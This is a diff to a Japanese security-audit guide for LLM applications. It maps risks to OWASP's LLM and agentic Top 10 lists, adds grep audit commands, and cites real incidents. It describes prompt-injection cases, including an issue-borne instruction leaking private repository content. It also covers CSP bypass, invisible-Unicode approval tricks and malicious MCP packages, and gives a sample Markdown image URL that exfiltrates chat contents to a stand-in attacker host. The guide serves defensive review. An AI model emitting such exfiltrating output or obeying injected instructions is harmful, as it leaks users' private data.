@@ -4,12 +4,28 @@
 ここで見るのは「作り方」ではなく「**動くときに LLM が入っているか**」になる。
 
 この資料の観点は OWASP Top 10 for LLM Applications の **2026 版**（2026-08-03）に合わせてある。
-2026 版は、初めて **7,700 件超の実インシデント**を投票と突き合わせて順位を決めた版で、
+2026 版は、初めて **実インシデントの記録（7,714 件を収集し、6,639 件を分類）** を投票と突き合わせた版で、
 「何を恐れているか」と「何が実際に起きているか」の差が明示された。**この差が判断に効く。**
+ただし順位は投票が 75%、インシデントが 25% の重みで、**投票が主**。公式は、インシデントだけで並べると
+プロンプトインジェクションは 10 位にも入らない（防御が効いて記録に残りにくい）と注記している。
+**記録に出にくいことを、起きにくいことと読み違えない。**
+
+| 2026 版 | この資料の節 |
+|---|---|
+| LLM01 Prompt Injection | 1 節 |
+| LLM02 Sensitive Information Disclosure | 4 節（他の利用者のデータ・ログ・観測ツール） |
+| LLM03 Excessive Agency | 3 節 |
+| LLM04 Supply Chain | 7 節、`references/10-dependencies.md` |
+| LLM05 Data and Model Poisoning | 4-2 節（検索対象と記憶への書き込み） |
+| LLM06 Unbounded Consumption | 5 節 |
+| LLM07 Misinformation | 5-2 節 |
+| LLM08 Hidden Context Exposure | 4 節（システムプロンプト・隠した指示・ツール定義） |
+| LLM09 Vector and Embedding Weaknesses | 4-2 節 |
+| LLM10 Improper Output Handling | 2 節 |
 
 **境界を先に決める。** 2026 版は「モデルがアプリの部品であるとき」を扱う。モデルが**ツールを呼び、
 セッションをまたいで記憶を持ち、下流に結果を及ぼす**なら、それは「アクター」で、
-**OWASP Top 10 for Agentic Applications**（2025-12 発表）の領域に移る。エージェント構成の評価では
+**OWASP Top 10 for Agentic Applications for 2026**（2025-12-09 公開）の領域に移る（対応は 3-2 節）。エージェント構成の評価では
 **両方を見る。どちらか一方では覆えない**、と公式が書いている。
 
 ## まず使っているかを確かめる
@@ -85,13 +101,24 @@ grep -rnE '\$\{[^}]*\}|\.format\(|f"|\+ *(body|content|text|message|input|query)
 | 出力の使い道 | 見るところ |
 |---|---|
 | 画面に表示 | HTML として解釈していないか（`dangerouslySetInnerHTML` 等）。`references/07-web-vulnerabilities.md` の 1 節 |
-| Markdown として描画 | リンクと画像の URL。`javascript:` と、**外部への画像 URL による情報送信** |
-| SQL / コマンドを組み立てる | 02 の D-1。**LLM に SQL を書かせて実行する構成は、それ自体が指摘** |
+| Markdown として描画 | リンクと画像の URL。`javascript:` と、**外部への画像 URL による情報送信**。参照形式のリンク、リンクのプレビュー（展開）、iframe も同じ経路 |
+| ログやターミナルに流す | ANSI エスケープなどの制御文字。見えない Unicode（タグ文字、ゼロ幅文字）で、表示と中身を食い違わせる |
+| SQL / コマンドを組み立てる | 02 の D-1。**LLM に SQL を書かせて実行する構成は、それ自体が指摘**。実行するなら、読み取り専用のロールか、許可したテーブルに限っているか。生成したコードを実行するサンドボックスに、ネットワークと資格情報が無いか（可視化用に生成したコードの実行で RCE になった CVE-2024-5565、プロンプトから SQL インジェクションに至った CVE-2024-8309 がある） |
 | 別の API へ渡す | SSRF（07 の 5 節）。宛先を LLM に決めさせていないか |
 | ファイルに書く / 保存する | パストラバーサル。格納型 XSS の経路（07 の 1-4） |
 
 **Markdown の画像は見落とされやすい。** `![](https://攻撃者/?d=<会話の内容>)` を出力させると、
 描画した時点で送信される。利用者が何もクリックしなくても起きる。
+
+**CSP で画像の送り先を絞っていても、許可したドメインが中継に使えれば抜ける。** 大手の業務向け AI
+（CVE-2025-32711）では、CSP で許可されていた自社のドメインを経由してデータが外へ出た。`img-src` /
+`connect-src` の許可リストに、**任意の URL へ転送できるもの（オープンリダイレクト、画像のプロキシ）が
+入っていないか**を見る。
+
+```bash
+grep -rnE 'react-markdown|marked|markdown-it|remark|rehype-raw|urlTransform|unfurl|linkPreview' \
+  --include='*.ts' --include='*.tsx' --include='*.js' . 2>/dev/null | grep -v node_modules | head
+```
 
 **LLM が生成したコードを、そのまま実行・保存・出荷していないか。** 2026 版は、アシスタントが
 大量に生成する安全でないコードを「出力の不適切な処理」の範囲に含めた。アプリが利用者の求めに
@@ -114,6 +141,9 @@ grep -rnE '\$\{[^}]*\}|\.format\(|f"|\+ *(body|content|text|message|input|query)
 # 定義されているツール・関数の一覧
 grep -rnE 'name:\s*["'"'"'][a-z_]+["'"'"']' --include='*.ts' --include='*.py' . \
   | grep -iE 'tool|function' | head -30
+# 登録の書き方は SDK ごとに違う。上で拾えないもの
+grep -rnE 'tool\(\{|tools:\s*\{|@tool|@function_tool|server\.tool\(|registerTool\(|@mcp\.tool|FastMCP' \
+  --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head -30
 ```
 
 ツール 1 つずつに、次を確認する。
@@ -127,6 +157,17 @@ grep -rnE 'name:\s*["'"'"'][a-z_]+["'"'"']' --include='*.ts' --include='*.py' . 
 **「ツールは 3 つだけだから安全」は成り立たない。** DB を検索するツール 1 つでも、
 条件を LLM に組み立てさせていれば、他人のデータに届く。
 
+**3 つが揃う構成を最優先で見る。** 2026 版の LLM01 の対策は、次の 3 つを**同時に**持つエージェントには、
+操作ごとに人の承認を必須にするよう求めている。
+
+- (A) 信頼できない入力を読む（問い合わせ本文、Web ページ、メール、課題票）
+- (B) 機密データに触れる
+- (C) 状態を変える、または外部と通信する
+
+2 つだけなら、残るリスクを明示して評価する。**資格情報と状態変更の能力は、モデルではなくアプリのコードが持ち、
+ツールの引数を決まった規則で検証し直す。** 承認画面には要約ではなく**実際に実行される内容**を出しているか
+（見えない文字で、表示と実行内容を食い違わせる手口がある）。
+
 ### 判定の目安
 
 | | 判定 |
@@ -135,22 +176,76 @@ grep -rnE 'name:\s*["'"'"'][a-z_]+["'"'"']' --include='*.ts' --include='*.py' . 
 | 状態を変える・承認なし | **問題あり。** インジェクションで実行できる |
 | システム権限で動く・対象を LLM が決める | **問題あり。最優先** |
 
+### 3-2. エージェント構成で追加で見るもの（Agentic Top 10）
+
+モデルが道具を持って動くなら、Top 10 for Agentic Applications for 2026 の 10 項目
+（ASI01 Agent Goal Hijack 〜 ASI10 Rogue Agents）も見る。この資料の他の節で覆えていないものは次のとおり。
+
+| 項目 | 見ること |
+|---|---|
+| ASI03 Identity and Privilege Abuse | エージェント自身の資格情報の範囲。利用者から委任されたトークンを、利用者が持たない範囲まで使っていないか |
+| ASI05 Unexpected Code Execution | 生成したコードを実行する環境の隔離（ネットワーク、ファイル、資格情報） |
+| ASI06 Memory & Context Poisoning | **長期の記憶への書き込みを特権操作として扱っているか。** 誰の入力で書かれたかを記録し、他の利用者の文脈に出ないか |
+| ASI07 Insecure Inter-Agent Communication | エージェント同士のやり取りを認証しているか |
+| ASI08 Cascading Failures | 呼び出しの連鎖に回数と費用の上限、止める仕組みがあるか |
+| ASI09 Human-Agent Trust Exploitation | 承認画面が、説得力のある出力で利用者を「承認」へ誘導していないか |
+| ASI10 Rogue Agents | 停止の手段と、振る舞いの記録 |
+
 ## 4. 漏れてはいけないものが文脈に入っていないか（Hidden Context Exposure）
 
 LLM に渡した内容は、**出力として出てくる可能性がある**と考える。
 
-2026 版は「システムプロンプトの漏えい」を **Hidden Context Exposure（隠した文脈の露出）**に
-改称・拡張した。**システムプロンプトだけの話ではない。** 検索で取ってきた文書、ツールが返した
-結果、セッションをまたぐ記憶、他の利用者の会話の断片も「文脈」で、**利用者に見せるつもりの
-なかったものが、出力を通じて見える**のが同じ失敗になる。
+2026 版は「システムプロンプトの漏えい」を **Hidden Context Exposure（隠した文脈の露出、LLM08）** に
+改称・拡張した。対象は**利用者に見せない制御用の文脈**で、システムプロンプト、開発者の指示、検索で取ってきた
+方針文、ツールの定義が入る。**他の利用者のデータや個人情報が出るのは LLM02（Sensitive Information Disclosure）**
+の側で、2026 版はその経路として、ツール呼び出しの引数、推論の過程、取得したチャンク、ログ、観測ツール、
+埋め込み、応答時間やトークン長まで挙げている。台帳で当てはめるときは、この 2 つを分けて書く。
 
 - システムプロンプトに秘密（鍵、内部 URL、他社名）を書いていないか。**システムプロンプトは
   漏れる前提で書く**。「これを教えてはいけない」と書いても、守られる保証は無い
 - **他の利用者のデータが文脈に入っていないか。** 検索結果をそのまま渡す構成で、
   絞り込みが LLM 任せになっていると混ざる
 - 会話履歴の保存先と保持期間。個人情報が入るなら `references/08-privacy-compliance.md` の 4 節
+- **LLM の観測ツール**（Langfuse、LangSmith など）は、既定でプロンプト・応答・取得した文書をすべて記録する。
+  保存先・保持期間・閲覧できる人を、会話履歴と同じ重さで見る
+- **会話の共有リンクがあるなら、検索エンジンに載らない指定（`noindex`）と、推測できない URL か。**
+  共有された会話が大量に検索エンジンに索引された事例がある
+- **LLM の事業者が、送ったデータを学習に使わない設定・契約になっているか**（個人情報保護委員会の注意喚起 2023-06）
 - **外部の LLM 事業者への送信が、公表している内容と合っているか**（08 の 5 節）。
   委託先として書かれているか、越境移転の記載があるか
+
+```bash
+grep -rnE 'langfuse|langsmith|LANGCHAIN_TRACING|helicone|shareUrl|sharedUrl|/share/' \
+  --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head
+# .env は名前だけ（値を出さない）
+grep -rhoE '^(LANGFUSE|LANGSMITH|LANGCHAIN|HELICONE)[A-Z_]*' .env* 2>/dev/null | sort -u
+```
+
+## 4-2. 検索（RAG）とベクトル DB（Vector and Embedding Weaknesses / Data Poisoning）
+
+**文書を検索して LLM に渡す構成では、権限の境界が検索の中にある。** ここが崩れると、
+LLM がどれだけ堅くても他人の文書が文脈に入る。
+
+- **テナントや権限の絞り込みを、検索の条件の中でしているか。** 検索した後で絞る方式だと、件数・スコア・
+  応答時間から他の文書の有無が推測できる
+- **絞り込みの条件をクライアントから受け取っていないか。** 公式の言い方では、クライアントが送ってきた
+  範囲は「提案であって、制御ではない」
+- 権限を**文書単位ではなくチャンク単位**で持っているか（1 つの文書の一部だけが機密、はよくある）
+- 信頼度の違うデータ（外部の Web、社内の機密、取引先のデータ）を 1 つのインデックスに混ぜていないか
+- 類似度のスコアをそのまま返していないか。**文書が存在するかどうかを調べる手段**になる
+- 元の文書を消したとき、埋め込みも消えるか
+- **埋め込みを元の文書と同じ機密度で扱っているか。** 埋め込みから元の文章を復元する手法がある
+- **誰が検索対象に文書を入れられるか。** 利用者が投稿した文書がそのまま検索対象に入るなら、それは他の利用者への
+  間接インジェクションの経路になる（LLM05）
+
+```bash
+grep -rnE 'similarity|match_documents|embedding|pgvector|pinecone|qdrant|weaviate|chroma|milvus|namespace|filter:' \
+  --include='*.ts' --include='*.py' --include='*.sql' . 2>/dev/null | grep -v node_modules | head -20
+```
+
+**Supabase で `match_documents` のような検索用の関数を使っているなら、それが定義者権限（security definer）で
+動いていないか**を `references/03-runtime-verification.md` の 1 節で確かめる。定義者権限なら RLS を迂回して、
+全テナントの文書が検索対象になる。
 
 ## 5. 費用と濫用（Unbounded Consumption）
 
@@ -201,6 +296,40 @@ grep -rnE '"command":|"args":|"url":' --include='*mcp*.json' . 2>/dev/null | hea
 
 **接続先が増えるほど境界が増える。** 1 つ侵されると、エージェント全体が乗っ取られる。
 使っていないサーバーが設定に残っていないかも見る。
+
+**後から中身が変わる前提で見る。** 承認した MCP サーバーの設定やツールの説明文が、後から書き換えられても
+再確認されない不具合があった（Cursor の CVE-2025-54136）。npm で配られた MCP サーバーが、ある版から送信する
+メールをすべて攻撃者に BCC するようになった事例もある（2025-09）。`npx -y <パッケージ>` のように版を固定せずに
+取ってくる定義は、それだけで指摘の候補になる。
+
+| 実例 | 何が起きたか |
+|---|---|
+| mcp-remote（CVE-2025-6514、CVSS 9.6） | 接続先のサーバーが返す認可 URL で、クライアント側の OS コマンドを実行できた。0.1.16 で修正 |
+| MCP Inspector（CVE-2025-49596） | 開発用ツールのプロキシに認証が無く、ブラウザから RCE。0.14.1 で修正 |
+| 公式の参照実装（Filesystem・git） | パスの検証漏れで、許可した範囲の外に届いた |
+| 公開リポジトリの Issue 経由 | Issue に仕込んだ指示で、エージェントが非公開リポジトリの内容を公開 PR に書き出した |
+
+### 6-2. アプリが MCP サーバーを提供している場合
+
+**使う側ではなく、提供する側の要件がある。** MCP の仕様（現行は 2026-07-28 版）は、HTTP で提供するサーバーに
+次を求めている。
+
+- OAuth 2.1 に従い、Protected Resource Metadata（RFC 9728）を公開する
+- **トークンが自分宛て（audience）に発行されたものかを検証する**
+- **受け取ったトークンを下流の API へそのまま転送しない**（token passthrough の禁止）
+- トークンをクエリ文字列に載せない。PKCE は `S256`
+- 第三者の API を中継するサーバーは、**クライアントごとの同意画面**を持つ（confused deputy 対策）。
+  同意画面自体に CSRF 対策とクリックジャッキング対策（`frame-ancestors`）が要る
+- 認可のメタデータを取りに行く処理で SSRF が起きないか（プライベートアドレスの遮断、リダイレクト先の検証）
+- 2026-07-28 版でプロトコル上のセッション（`Mcp-Session-Id`）は廃止された。**セッション ID を認証に使っていないか**
+- `localhost` で待ち受けるサーバーも認証を必須にする。**`0.0.0.0` で待ち受けていないか**、DNS リバインディングに備えているか
+
+```bash
+grep -rnE 'McpServer|StreamableHTTPServerTransport|FastMCP|oauth-protected-resource|WWW-Authenticate|Mcp-Session-Id|0\.0\.0\.0' \
+  --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head
+# 受け取った Authorization をそのまま下流へ渡していないか
+grep -rnE 'Authorization.*(req|request)\.headers' --include='*.ts' --include='*.py' . 2>/dev/null | grep -v node_modules | head
+```
 
 ## 7. 依存としての AI ライブラリ
 
